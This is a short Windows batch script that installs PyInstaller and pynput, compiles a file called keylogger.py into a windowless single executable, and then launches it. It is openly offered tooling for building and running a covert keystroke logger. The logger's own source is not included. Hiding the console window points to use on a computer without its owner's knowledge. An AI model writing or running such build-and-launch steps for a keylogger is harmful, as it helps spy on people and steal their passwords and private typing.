@echo off
pip install pyinstaller
pip install pynput
pyinstaller.exe --noconsole --onefile keylogger.py
IF %ERRORLEVEL% NEQ 0 (
echo FAILED TO PRODUCE EXE FILE.&echo
pause
)
\dist\keylogger.exe
